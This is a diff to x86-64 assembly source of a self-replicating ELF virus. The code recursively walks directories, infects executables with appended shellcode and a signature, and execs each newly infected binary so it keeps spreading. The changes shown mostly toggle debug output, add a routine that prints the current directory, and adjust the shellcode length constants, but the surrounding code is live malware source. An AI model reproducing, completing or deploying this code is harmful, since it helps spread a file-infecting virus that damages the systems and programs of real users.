@@ -542,8 +542,8 @@ handle_dir:
 	cmp rax, 0
 	jne hd_parent
 	mov rax, 80
-	call ft_puts
-	call debug
+;	call ft_puts
+	;call debug
 	syscall;chdir(fname);
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]	
@@ -567,7 +567,7 @@ handle_dir:
 	pop rdx
 	pop rsi
 	pop rdi
-	call debugy
+;	call debugy
 retn
 
 ;void rec_infect_dir(char *fname)
@@ -629,6 +629,8 @@ retn
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
 ;	call ft_puts
+;	call debug
+;	call print_cwd
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
@@ -639,6 +641,20 @@ launch_infected:
 	syscall;execve(fname, {fname, NULL}, {NULL});
 	add rsp, 16
 	jmp exit_prog; new infected binary will carry on infecting the rest of the folder and nested folders
+retn
+
+print_cwd:
+push rdi
+	sub rsp, 1024
+	
+	lea rdi, [rsp]
+	mov rsi, 1000
+	mov rax, 79
+	syscall
+	call ft_puts
+	call debug
+	add rsp, 1024
+pop rdi
 retn
 
 ;infect ONE file
@@ -977,9 +993,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6468 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6417 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6412 
+%define SHELLCODE_LEN 6517 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6466; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6461 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
